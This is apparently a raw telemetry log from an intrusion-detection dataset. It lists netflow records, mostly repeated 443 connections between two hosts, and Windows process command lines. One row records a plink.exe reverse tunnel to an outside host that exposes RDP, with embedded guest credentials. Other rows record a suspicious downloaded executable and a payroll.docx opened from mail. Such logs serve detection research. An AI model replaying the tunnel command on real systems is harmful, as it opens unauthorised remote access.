14e87cdf-8a7b-434f-8149-9263e3d31ce3,{'netflow': '142.20.57.246:53476->202.6.172.98:443'},838891
ee881a33-b540-4a92-9ce6-8134bfa1daf7,{'netflow': '202.6.172.98:443->142.20.57.246:53383'},830701
82358590-ca24-4f6b-92f8-36d337ef717b,{'netflow': '142.20.57.246:53336->202.6.172.98:443'},826613
c555d2d4-5199-4ead-a6a4-37813824e0e2,{'netflow': '142.20.57.246:53421->202.6.172.98:443'},832759
40170594-d5c1-44cd-a221-f3e2f4da7934,{'netflow': '202.6.172.98:443->142.20.57.246:53454'},836856
121158cb-6a0d-4a6c-a160-e6f25720a0cd,{'netflow': '202.6.172.98:443->142.20.57.246:50122'},812281
0627360b-d315-4bd2-980a-32eff4f17d92,{'netflow': '202.6.172.98:443->142.20.57.246:49991'},808186
5d150e37-54ed-43ef-819c-ab1d0e8f82ae,{'netflow': '142.20.57.246:50122->202.6.172.98:443'},812280
765d89a5-0170-4ebb-a80a-d7fdcb86facc,{'netflow': '202.6.172.98:443->142.20.57.246:49976'},806144
e11fa54a-41be-430f-abf1-bd3a29228eac,{'netflow': '142.20.57.246:53987->202.6.172.98:443'},857352
4932606a-c6d5-48c2-b2cf-9774b3c51aa1,{'netflow': '202.6.172.98:443->142.20.57.246:53920'},849160
f83615e0-0015-4657-8e90-87ea971598e7,{'file': '/Device/HarddiskVolume1/$Mft'},70927
4798594c-b31f-4841-9ae4-7a4911fb2023,{'netflow': '142.20.57.246:53933->202.6.172.98:443'},851216
22efa912-f64d-4bc8-a2b0-367b1faa8f9d,{'netflow': '142.20.57.246:50002->202.6.172.98:443'},810257
626d66bb-b5c8-4653-a47c-43e193903a55,{'netflow': '142.20.57.246:50003->202.6.172.98:443'},810258
4a433ec7-38b9-4af1-b495-56c37b8c777c,{'netflow': '142.20.57.246:53438->202.6.172.98:443'},834835
81683cf0-9d51-441d-a265-7d780046f679,{'netflow': '202.6.172.98:443->142.20.57.246:53438'},834836
fd905aab-f583-417f-9000-488ec949b4bd,{'netflow': '202.6.172.98:443->142.20.57.246:53942'},853273
14313a9f-bf8c-4f6d-848a-ef681da19618,{'netflow': '202.6.172.98:443->142.20.57.246:50002'},810267
9ef6fabe-093f-4db7-825a-f12f3563bb92,{'netflow': '202.6.172.98:443->142.20.57.246:50003'},810268
3282ddb8-ab1f-4dcd-b632-5ca73ed3134a,{'netflow': '202.6.172.98:443->142.20.57.246:53987'},857375
490df64b-fa98-47c4-ba99-52eb37e9de5a,{'netflow': '202.6.172.98:443->142.20.57.246:53880'},845090
88f11352-9c33-4cc0-813a-89404c7294ea,{'netflow': '202.6.172.98:443->142.20.57.246:53476'},838946
17b9048d-60d5-4c9b-b455-0f8e8a6d9d8d,{'netflow': '202.6.172.98:443->142.20.57.246:53336'},826661
7602e8af-04f4-4814-9c95-2a7496df2d4d,{'netflow': '202.6.172.98:443->142.20.57.246:53421'},832810
e4cb794a-afb6-4793-8f62-c5952fbabf1d,{'netflow': '142.20.57.246:53904->202.6.172.98:443'},847149
0681930d-9173-4659-9edb-d5ecc92d28b5,{'netflow': '142.20.57.246:50123->202.6.172.98:443'},812336
9aff27c3-7c11-4993-ab55-fdace2edfd76,{'netflow': '142.20.57.246:50124->202.6.172.98:443'},812337
494a86f6-e177-4fac-afd4-15b49ea00746,{'netflow': '202.6.172.98:443->142.20.57.246:50123'},812338
0f70c1bb-dca1-4e21-ab01-42b0de1bfaec,{'netflow': '202.6.172.98:443->142.20.57.246:50124'},812339
1292c5fa-71bf-4848-9d57-e931f48add02,{'netflow': '202.6.172.98:443->142.20.57.246:53960'},855350
ecdf2ca0-5411-4411-b6fa-edc791716cca,{'netflow': '142.20.57.246:54062->202.6.172.98:443'},861497
0a91e093-8993-4465-86ee-68874f432548,{'netflow': '142.20.57.246:53358->202.6.172.98:443'},828736
b33268af-5e0d-40bf-8cf7-0c3d72d5b921,{'netflow': '202.6.172.98:443->142.20.57.246:54062'},861507
62609615-64bf-442b-b54d-561d40322028,{'netflow': '202.6.172.98:443->142.20.57.246:53933'},851272
1deb1396-40e9-418c-a994-8f373e964c0d,{'netflow': '142.20.57.246:53359->202.6.172.98:443'},828749
727f0ddf-9731-479d-9826-05f9ba17a500,{'netflow': '202.6.172.98:443->142.20.57.246:49938'},804173
6b13ece4-99eb-44ae-b30c-709199c00af6,{'netflow': '202.6.172.98:443->142.20.57.246:53358'},828752
b10b2be1-6189-4cb6-ad37-5823dccb1321,{'netflow': '142.20.57.246:53360->202.6.172.98:443'},828753
bb54ffe4-3eb6-4e1d-9524-76aa48eb4440,{'netflow': '202.6.172.98:443->142.20.57.246:53359'},828754
f9d8778a-890f-47ab-93b2-2d598cbbfc90,{'netflow': '202.6.172.98:443->142.20.57.246:53904'},847184
99f58c0a-4914-40e4-8ab1-881c5cf95c9c,{'netflow': '202.6.172.98:443->142.20.57.246:53360'},828759
5dcbba22-815c-42a3-8373-0db70b57852f,{'netflow': '142.20.57.246:53361->202.6.172.98:443'},828766
c058da3e-4b1c-4770-8555-920ea5199557,{'netflow': '142.20.57.246:53362->202.6.172.98:443'},828769
624538cd-0a22-4a4f-aa0f-3fefeba66192,{'netflow': '202.6.172.98:443->142.20.57.246:53361'},828772
43eb41b9-8394-477a-8bf9-8cbb321ad733,{'netflow': '142.20.57.246:53363->202.6.172.98:443'},828773
b7046cbd-027d-435b-bab3-8dc9c7c15f76,{'netflow': '142.20.57.246:53278->202.6.172.98:443'},822634
eaf951bb-0d48-43b1-9f9d-da71e15df956,{'netflow': '142.20.57.246:49992->202.6.172.98:443'},808299
dffb4aae-42a5-4104-9f36-ea3666bab4d0,{'netflow': '142.20.57.246:53337->202.6.172.98:443'},826732
12849d06-f461-4af8-8954-fcf1c65a1eee,{'netflow': '142.20.57.246:53366->202.6.172.98:443'},828780
9e3dce2b-fbd0-4dfd-a268-0fb71b200986,{'netflow': '142.20.57.246:53679->202.6.172.98:443'},843118
f6006ae7-289e-4eb8-9beb-027dc560c7ac,{'netflow': '202.6.172.98:443->142.20.57.246:53362'},828785
d8723dec-6c26-4593-a2ac-791bfaf078af,{'netflow': '202.6.172.98:443->142.20.57.246:53363'},828786
b18d5056-634e-4fb7-852f-6170bfe4a517,{'netflow': '142.20.57.246:53988->202.6.172.98:443'},857462
3c5c592a-bf53-4a06-99da-db1345565e5e,{'subject': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe C:/Windows/System32/mobsync.exe -Embedding'},5495
ea07fd25-cbc9-4782-9977-e3da934a776e,{'netflow': '202.6.172.98:443->142.20.57.246:53366'},828792
790d99a7-e96f-4f94-bce5-80af6132c21c,{'netflow': '202.6.172.98:443->142.20.57.246:53988'},857466
dd3390dc-8c77-4360-ae52-b8eccd26c36f,{'netflow': '142.20.57.246:53338->202.6.172.98:443'},826749
8d910946-5d6a-46af-991e-7b99597e1305,{'netflow': '202.6.172.98:443->142.20.57.246:49992'},808318
0a04bae2-e67d-4445-8668-7855d115df2b,{'netflow': '142.20.57.246:49951->202.6.172.98:443'},804226
ed3466bf-58b5-4a06-a6df-a28803be51e8,{'netflow': '142.20.57.246:53302->202.6.172.98:443'},824708
5893d4bd-d0a6-428e-93b3-bd453ce17823,{'netflow': '142.20.57.246:53934->202.6.172.98:443'},851333
65548ebb-ce87-402f-92c2-529bb8ecea2e,{'netflow': '142.20.57.246:53921->202.6.172.98:443'},849284
cdcf7a8d-22e8-4df1-9659-214eb06c41dc,{'netflow': '202.6.172.98:443->142.20.57.246:53337'},826759
1137e622-a962-4c8a-81ea-4d1cca30c6cf,{'netflow': '202.6.172.98:443->142.20.57.246:53934'},851336
0948bff9-9927-4cae-b6de-57fd7fe88e5e,{'netflow': '202.6.172.98:443->142.20.57.246:49951'},804230
098137ec-54a0-4ead-a088-d6e83d042fcc,{'netflow': '142.20.57.246:53455->202.6.172.98:443'},837002
6759c684-eae0-495c-ba97-3e0527acb242,{'netflow': '142.20.57.246:49977->202.6.172.98:443'},806298
7d8d9b5f-25b3-4888-8d63-29d12b60ce38,{'netflow': '142.20.57.246:53999->202.6.172.98:443'},859548
86d01cee-78bf-4888-aa3c-76864341c951,{'netflow': '202.6.172.98:443->142.20.57.246:53302'},824733
cd4ce82a-4dcb-4f45-ab82-6cb76561e75a,{'netflow': '202.6.172.98:443->142.20.57.246:53278'},822692
d505558a-5113-44cc-b01e-47813f9a2b3a,{'netflow': '202.6.172.98:443->142.20.57.246:53999'},859565
0a6e8f8f-942e-47e1-b9f7-183ab382a45e,{'netflow': '202.6.172.98:443->142.20.57.246:53338'},826799
5056e286-d26a-4bfe-b234-bcd3c3a91bf1,{'netflow': '142.20.57.246:53279->202.6.172.98:443'},822708
9ccd343b-cf4d-4bdd-abd8-c6dd228d4c2f,{'netflow': '142.20.57.246:53989->202.6.172.98:443'},857526
3317e8ce-8f59-4100-89a7-48365a1f7df6,"{'subject': '/Device/HarddiskVolume1/Windows/system32/plink.exe ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest'}",5560
3772b611-e09c-4472-b81d-2b294b98ede5,{'netflow': '202.6.172.98:443->142.20.57.246:53279'},822713
2df7c66f-42bc-4653-bad9-0ffc958e23fe,{'netflow': '142.20.57.246:53384->202.6.172.98:443'},830907
b594372e-0e67-419f-ae6a-7619caa026a6,{'netflow': '142.20.57.246:53385->202.6.172.98:443'},830908
b0902567-08f5-41fc-a29d-20c7b09e968a,{'netflow': '202.6.172.98:443->142.20.57.246:53989'},857532
dd26eb11-65e5-41d1-98dd-928190863673,{'netflow': '202.6.172.98:443->142.20.57.246:53384'},830909
dd8dd76b-3389-4d40-95c4-a1cd269891c7,{'netflow': '202.6.172.98:443->142.20.57.246:53385'},830910
3b764bd9-ad50-428a-9f8a-35f6311057dc,{'netflow': '142.20.57.246:53439->202.6.172.98:443'},835009
7b0795e5-3099-42fc-876d-501bda735b54,{'netflow': '142.20.57.246:54064->202.6.172.98:443'},861638
a34b8847-4687-4d4c-85c0-21a48234deea,{'netflow': '142.20.57.246:53479->202.6.172.98:443'},839113
5cbd0ff8-a37e-45cf-bfa7-32cca56c6d2e,{'netflow': '202.6.172.98:443->142.20.57.246:53479'},839120
ec0ec3a4-1982-4126-aec7-d82621ccfce1,{'netflow': '142.20.57.246:54065->202.6.172.98:22'},861652
24004199-4ebd-4041-9714-12c6609d45c2,{'netflow': '142.20.57.246:53428->202.6.172.98:443'},832984
a4f8397f-ce98-4ef6-ae7a-1d75cefc8e26,{'netflow': '202.6.172.98:443->142.20.57.246:53921'},849371
379dd8af-6184-4990-8028-17a8a3fc180b,{'netflow': '202.6.172.98:443->142.20.57.246:53679'},843228
1b78d632-e3e6-46bc-ac41-04fc5eca1cdb,{'netflow': '142.20.57.246:53480->202.6.172.98:443'},839133
696746c1-d42c-4037-a273-9ae9f4071d52,{'netflow': '142.20.57.246:49993->202.6.172.98:443'},808421
008e4d96-4354-4315-a71a-74024e9e5df2,{'netflow': '202.6.172.98:443->142.20.57.246:53455'},837094
f331fd7f-83e8-46d9-a0dd-6ffe18aaaff3,{'netflow': '142.20.57.246:53911->202.6.172.98:443'},847334
63d71f5a-a0cb-44d7-8a10-ba021d3ea466,{'netflow': '202.6.172.98:443->142.20.57.246:49977'},806385
c10664bb-bdcb-43fc-b789-5631a93cef5b,{'netflow': '142.20.57.246:53491->202.6.172.98:443'},841201
ad9e6771-d865-4777-bbda-26c949ca5914,{'netflow': '202.6.172.98:443->142.20.57.246:53439'},835059
6918e982-8518-455b-bf62-f0545ff51223,{'subject': 'System None'},3570
91dc35cb-f509-4ea9-8cbd-4de5d2e62e6b,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe /SystemRoot/System32/smss.exe'},3569
48ff772b-9d7a-4d68-b74e-86e7a4a3242d,{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe None'},3576
7ee09540-06e8-4e5f-ac54-949c34743517,{'netflow': '142.20.57.246:53881->202.6.172.98:443'},845309
c6f34b3d-1982-4852-b9b6-c90ca546e7a5,{'netflow': '202.6.172.98:443->142.20.57.246:53480'},839170
6044291a-425e-4ae5-a39e-425a81a468d9,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe None'},3586
570f0df4-73e8-486d-9b4f-39e4d0aa4ef8,{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe None'},3587
832a1376-197a-415b-b4d9-cb2cbd753763,{'netflow': '142.20.57.246:50125->202.6.172.98:443'},812550
66cc25a8-2044-4754-9eb2-22068150e797,{'netflow': '142.20.57.246:54000->202.6.172.98:443'},859654
81b592b1-21f5-49d0-97d1-4f2bedfd88de,{'netflow': '142.20.57.246:50126->202.6.172.98:443'},812551
a9db395b-a607-4da5-900b-74d19de94407,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe C:/Windows/System32/svchost.exe -k utcsvc'},3594
b35f80d7-25ae-4bc1-a020-78dea3c85c63,{'netflow': '202.6.172.98:443->142.20.57.246:50125'},812555
2e0faadf-8f78-455e-9add-6b28f29850af,{'netflow': '202.6.172.98:443->142.20.57.246:50126'},812556
d7491c2b-82d9-47d3-bcda-f4bc03f720f8,{'netflow': '202.6.172.98:443->142.20.57.246:54000'},859662
a35052e0-7a67-4617-81e8-75533cff577a,{'netflow': '202.6.172.98:443->142.20.57.246:53428'},833041
72225268-a850-4413-a4bc-0592e2f61344,{'netflow': '142.20.57.246:53943->202.6.172.98:443'},853522
429232e5-6a83-4051-9985-32ea421f19ec,"{'subject': '%SystemRoot%/system32/csrss.exe %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'}",5650
d63c1192-9ccb-4b2c-913f-22f7c5b03d30,{'netflow': '142.20.57.246:53304->202.6.172.98:443'},824854
afb688ea-7298-44da-bcbd-23d60c4643aa,{'netflow': '202.6.172.98:443->142.20.57.246:53943'},853533
427c5d12-01ed-4c79-b631-cd54f53db256,{'netflow': '142.20.57.246:53961->202.6.172.98:443'},855583
c0e29714-5b17-4cf6-99a2-d82a35da6d36,{'subject': '/Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe None'},5665
4990633f-4bcf-4ac0-b6a1-6ba6c2d7352e,{'netflow': '202.6.172.98:443->142.20.57.246:53881'},845358
847d09d8-a4e8-4be8-95ef-aaade0782ac2,{'netflow': '202.6.172.98:443->142.20.57.246:53911'},847407
04718ec1-0510-44bb-8ca3-7eaffa9f384a,{'netflow': '142.20.57.246:53935->202.6.172.98:443'},851512
53f39396-f687-48b4-a4cf-42d00d5b6edf,{'netflow': '142.20.57.246:53922->202.6.172.98:443'},849466
acdbee39-aa42-4a94-92f0-e3c4c7e8fdb0,{'netflow': '142.20.57.246:53367->202.6.172.98:443'},828989
1cecf607-ff7b-4f1b-9f3a-1f5dcd9b494a,{'netflow': '142.20.57.246:53339->202.6.172.98:443'},826942
903f520d-4abd-4fd7-b5e8-566f7c63ee81,{'netflow': '202.6.172.98:443->142.20.57.246:53367'},828992
ad283fd5-af13-4cae-976d-5ea94d121a78,{'netflow': '142.20.57.246:53368->202.6.172.98:443'},828993
2bac8b6d-8335-48e4-8811-f8a811bc23c9,{'netflow': '142.20.57.246:53369->202.6.172.98:443'},828994
ea31c2f7-1cf2-4b29-8c98-1b71808510ac,{'netflow': '202.6.172.98:443->142.20.57.246:53304'},824899
0b21c4c2-58dc-4ad5-b7bb-2b55f59dff42,{'netflow': '202.6.172.98:443->142.20.57.246:53935'},851524
fcff2b85-7660-4c6b-b99f-0e3f0121ee01,{'netflow': '202.6.172.98:443->142.20.57.246:54064'},861767
adecf527-035e-4828-9e2d-860faba8dde3,{'netflow': '202.6.172.98:22->142.20.57.246:54065'},861768
c9f7d6b4-f269-4596-8523-ac750177cf32,{'netflow': '202.6.172.98:443->142.20.57.246:53368'},828999
157535a9-33b5-47eb-b3a4-3e078d87cd54,{'netflow': '202.6.172.98:443->142.20.57.246:53491'},841291
37908885-40aa-4a21-a0ff-3aea592f000c,{'netflow': '142.20.57.246:53440->202.6.172.98:443'},835148
a8e1af84-0eed-4487-82cb-3a55f4f70392,{'netflow': '202.6.172.98:443->142.20.57.246:53440'},835149
5e0349f1-8402-4761-9bc8-4bc32d83cfa3,{'netflow': '202.6.172.98:443->142.20.57.246:49993'},808528
ea91d766-22ed-459b-bf15-b5f807b47409,{'netflow': '142.20.57.246:53280->202.6.172.98:443'},822866
ab2309f9-d567-446f-9d9b-7d81c7d5d199,{'netflow': '202.6.172.98:443->142.20.57.246:53280'},822877
42aa340a-c0b3-4723-aec0-95d2126f0a36,{'netflow': '142.20.57.246:50006->202.6.172.98:443'},810590
7bb40a6b-52bc-44be-b1f2-d4c6e4bbf46a,{'netflow': '142.20.57.246:49958->202.6.172.98:443'},804446
5853dbd8-2adf-468f-b275-3ed5e2e92fee,{'netflow': '142.20.57.246:53944->202.6.172.98:443'},853603
4455be06-ee44-4a79-bc11-256e3f72a4fa,{'netflow': '202.6.172.98:443->142.20.57.246:53961'},855652
b1587d8f-0e1b-479e-bce7-2737fc509e23,{'netflow': '202.6.172.98:443->142.20.57.246:53944'},853605
fdb482c9-5338-47b6-ac00-e5d7227c1a70,{'netflow': '142.20.57.246:53990->202.6.172.98:443'},857701
1b6a9bfb-f741-4117-8ec3-8cf064e7294e,{'netflow': '142.20.57.246:50007->202.6.172.98:443'},810595
7c360e51-97ad-4fdf-b627-bd761cc8399f,{'netflow': '202.6.172.98:443->142.20.57.246:53990'},857706
b3708918-71bc-4c9e-adff-76e093552da7,{'netflow': '202.6.172.98:443->142.20.57.246:50006'},810604
0013f57d-321e-4d79-b788-976d44e3006e,{'netflow': '202.6.172.98:443->142.20.57.246:50007'},810605
d8380b63-698d-4c94-a64e-c7faf28732a5,{'netflow': '142.20.57.246:50128->202.6.172.98:443'},812662
89dae5ad-f1e8-4a26-a60b-77251a6b5d20,{'netflow': '142.20.57.246:50129->202.6.172.98:443'},812663
ebb01ed9-1302-4af1-8c4c-22312d6468ec,{'netflow': '142.20.57.246:53281->202.6.172.98:443'},822904
d741f163-d0b3-40f0-89a0-bbc904c42901,{'netflow': '142.20.57.246:53340->202.6.172.98:443'},827001
917db26d-0ad4-4f68-ad76-1c7e3d063bb5,{'netflow': '142.20.57.246:49978->202.6.172.98:443'},806524
78360c9b-f891-4c2f-8a2c-9ff9783f48ad,{'netflow': '142.20.57.246:53936->202.6.172.98:443'},851581
3237926c-44bf-48f6-ba77-e4591b6c4d52,{'netflow': '142.20.57.246:50008->202.6.172.98:443'},810622
b5148b27-371f-401d-8421-7ae72079b7ee,{'netflow': '202.6.172.98:443->142.20.57.246:53936'},851582
6f3954ed-d1cd-43ba-ad32-b59408cb76b2,{'netflow': '142.20.57.246:50009->202.6.172.98:443'},810623
834c7fcb-9099-4406-bea6-ae8822255136,{'netflow': '202.6.172.98:443->142.20.57.246:53339'},827008
9eee5def-e5a5-42ee-a045-808ed70ad4af,{'netflow': '202.6.172.98:443->142.20.57.246:50129'},812672
3b8b25f9-4566-4214-98e2-6059b42a0917,{'netflow': '202.6.172.98:443->142.20.57.246:53281'},822913
33c00aff-509a-4e30-a662-336696844353,{'netflow': '202.6.172.98:443->142.20.57.246:53481'},839298
aa1d206c-e401-45fd-a3fc-08a9dd7b4285,{'netflow': '202.6.172.98:443->142.20.57.246:50128'},812673
cdee0997-359a-4db8-bbe6-118fbe92a96d,{'netflow': '142.20.57.246:53884->202.6.172.98:443'},845445
bb936ea1-4a0f-424a-8d9b-890665ce63eb,{'netflow': '142.20.57.246:53481->202.6.172.98:443'},839297
559e9806-2aa1-47e2-a180-68298a91a946,{'netflow': '202.6.172.98:443->142.20.57.246:50008'},810631
f79ec1eb-64b4-4dbe-9176-0e9426e0220c,{'netflow': '202.6.172.98:443->142.20.57.246:49978'},806530
4acd096a-a2f8-483f-a11f-175932fe8e93,{'netflow': '142.20.57.246:53429->202.6.172.98:443'},833164
08d711a9-ab76-4035-a1d4-e91f3be546b6,{'subject': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe None'},5773
0e0e08e5-dc27-4460-a3a5-41105a7c4db8,{'netflow': '202.6.172.98:443->142.20.57.246:53369'},829086
4be52b0c-6e01-4bc4-b27f-5c7ef1e1fdac,{'netflow': '202.6.172.98:443->142.20.57.246:53429'},833186
37537783-4b0e-4aaf-9a07-4b4b30624b0a,{'netflow': '142.20.57.246:49994->202.6.172.98:443'},808611
5fdbe8cf-807f-4f73-bbc6-b09d5356c185,{'netflow': '202.6.172.98:443->142.20.57.246:53340'},827043
412bda08-1aa2-4374-be9d-8e6ae231daa9,{'netflow': '142.20.57.246:53370->202.6.172.98:443'},829101
c8d10386-379c-4bff-bd04-61ae0003da85,{'netflow': '142.20.57.246:53371->202.6.172.98:443'},829102
801d727e-4ad1-4516-9bf6-b41cc1dbdea9,{'netflow': '202.6.172.98:443->142.20.57.246:49994'},808627
c9e0238a-1cdf-4a5e-9ab6-cbfea0bd8c4a,"{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"'}",3770
91cf6eed-6ee7-43aa-a2d0-62e81ca89e2e,"{'subject': '/Device/HarddiskVolume1/Windows/system32/lsass.exe ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"'}",3771
3c7b52b8-f6b4-45b5-9632-4a857197fd61,{'netflow': '202.6.172.98:443->142.20.57.246:53390'},831169
8f610c63-d117-4c64-8412-ced8aa6b30d0,{'netflow': '202.6.172.98:443->142.20.57.246:50009'},810692
f5552091-0e7f-4d76-bcd7-6fdb8c6ce778,{'netflow': '142.20.57.246:53390->202.6.172.98:443'},831173
53a7fc38-8fe7-4ec1-a608-0ea117b8dd47,{'netflow': '202.6.172.98:443->142.20.57.246:53884'},845510
1d6d84c7-695b-4f9d-b2ed-bd26e5d1bfcc,{'netflow': '142.20.57.246:54001->202.6.172.98:443'},859847
283cbadc-58f9-40f8-b743-4e72039b32bb,{'netflow': '142.20.57.246:53945->202.6.172.98:443'},853703
d41d6558-a4ff-4d15-a772-767095a9f86d,{'netflow': '202.6.172.98:443->142.20.57.246:49958'},804554
72d1d7c6-dae4-42af-b726-3da605f73c0e,{'netflow': '142.20.57.246:53991->202.6.172.98:443'},857803
76216d35-1375-4957-958d-16c97b049fdc,{'netflow': '142.20.57.246:53914->202.6.172.98:443'},847567
d514b613-d5c8-4377-9ff9-2dbeee33c00d,{'netflow': '202.6.172.98:443->142.20.57.246:54001'},859856
ac94a091-609f-467e-8392-de1c73bc73d2,{'netflow': '202.6.172.98:443->142.20.57.246:53991'},857810
2ea61a98-febd-49ec-9c47-81a31884b0c0,{'netflow': '142.20.57.246:53482->202.6.172.98:443'},839383
8ee15ca0-1964-416c-9862-2e89d843186f,{'netflow': '142.20.57.246:49964->202.6.172.98:443'},804567
6c9cc27c-6fb2-4411-b69f-8d918b950b7a,{'netflow': '142.20.57.246:53441->202.6.172.98:443'},835289
1c205927-e71f-47ed-84a7-5a4ea9f86264,{'netflow': '142.20.57.246:53305->202.6.172.98:443'},825050
01bc0dc5-3dd6-4297-8a0a-2b8be2703f32,{'netflow': '142.20.57.246:53306->202.6.172.98:443'},825051
a1e82a8c-13fb-4be9-8c52-5ec82895e9a7,{'netflow': '202.6.172.98:443->142.20.57.246:53482'},839388
7d8c6ab8-8ddb-4164-a0a7-f66eb91bbb74,{'netflow': '202.6.172.98:443->142.20.57.246:53305'},825058
0979f91f-2641-4bf2-a4c2-d462b2a650d7,{'netflow': '202.6.172.98:443->142.20.57.246:53306'},825059
3c241579-d454-47e6-9165-ed0bf144d90b,{'netflow': '142.20.57.246:51163->202.6.172.98:443'},814821
5fc70892-70f0-4383-9028-57439e79d21a,{'netflow': '202.6.172.98:443->142.20.57.246:53441'},835304
a205ebce-d02a-47b5-8fad-691ff8d32f29,{'netflow': '202.6.172.98:443->142.20.57.246:53922'},849643
054df7d9-801e-49d0-b8cd-4f20b42a4305,{'subject': '/Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe None'},3820
f202fb64-9a1a-4e45-930c-6c10266aab59,{'netflow': '142.20.57.246:53492->202.6.172.98:443'},841453
98f5435f-b4c8-420d-af01-d3b530805cad,{'netflow': '142.20.57.246:53430->202.6.172.98:443'},833262
55016343-af49-4fdd-9714-194a0bd8ae76,{'netflow': '142.20.57.246:50130->202.6.172.98:443'},812783
ca664460-47c5-40f0-ab95-e7f98b54a566,{'netflow': '202.6.172.98:443->142.20.57.246:50130'},812784
4524e03f-6ea7-47a3-84f2-84016d53dab8,"{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""'}",5880
946b9e95-68be-4003-ae5b-9a45ffafcdf1,{'netflow': '142.20.57.246:53962->202.6.172.98:443'},855801
7a7ed319-25c7-4fd9-87c3-c1891ea6bb35,{'netflow': '202.6.172.98:443->142.20.57.246:53945'},853754
1a4bfafc-54e7-432d-9bdd-9edf33150e79,{'netflow': '142.20.57.246:50136->202.6.172.98:443'},812793
daec9d1f-b6ad-4250-84c5-99f0156349e5,"{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help'}",5881
60c6a2ba-fe79-4d5e-853f-8d4dd57f0faa,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5883
2a7d5baa-002d-4708-a8e6-e259e64bc00b,{'netflow': '202.6.172.98:443->142.20.57.246:50136'},812799
47d9c284-eb47-4aea-a264-e3920cae7f30,{'netflow': '142.20.57.246:53946->202.6.172.98:443'},853762
6cc3d0bd-4c0a-4ef1-ad78-2819c7a9930c,{'netflow': '202.6.172.98:443->142.20.57.246:53946'},853763
185264a8-6bbc-41c9-8f75-8454fdcc44ef,{'netflow': '202.6.172.98:443->142.20.57.246:49964'},804625
fae98e00-589c-4e36-a2b6-116dda93abfc,{'netflow': '202.6.172.98:443->142.20.57.246:53914'},847636
f27952da-f8b7-4447-bdc2-ee086d205721,{'netflow': '142.20.57.246:51149->202.6.172.98:443'},814870
98e71d27-952a-4353-bd00-88a1d1f9101e,{'netflow': '202.6.172.98:443->142.20.57.246:53492'},841494
9001a320-1e78-4742-af73-e32c42cf3cf9,{'file': '/Device/HarddiskVolume1/Windows/system32/plink.exe'},89883
1298e1db-2fe8-4947-a75c-ac715840c729,{'netflow': '142.20.57.246:49980->202.6.172.98:443'},806690
3551dcff-0d4f-45a8-b5ad-5315abc1f408,{'netflow': '142.20.57.246:49969->202.6.172.98:443'},804644
8dec7284-b38b-4622-b4e0-4f89b0195e25,{'netflow': '202.6.172.98:443->142.20.57.246:53430'},833317
36e36edb-7bc2-40aa-b7ca-7ce12e69a9a3,{'netflow': '142.20.57.246:49995->202.6.172.98:443'},808755
0a27ecf7-604a-430f-91ef-e5b4ab3b7838,{'netflow': '202.6.172.98:443->142.20.57.246:49995'},808760
0d299ce5-0ce3-4321-9883-f16fe34de77a,{'netflow': '142.20.57.246:53947->202.6.172.98:443'},853819
3fe64796-b205-4058-b68e-189cb0d3ef17,{'netflow': '202.6.172.98:443->142.20.57.246:53947'},853822
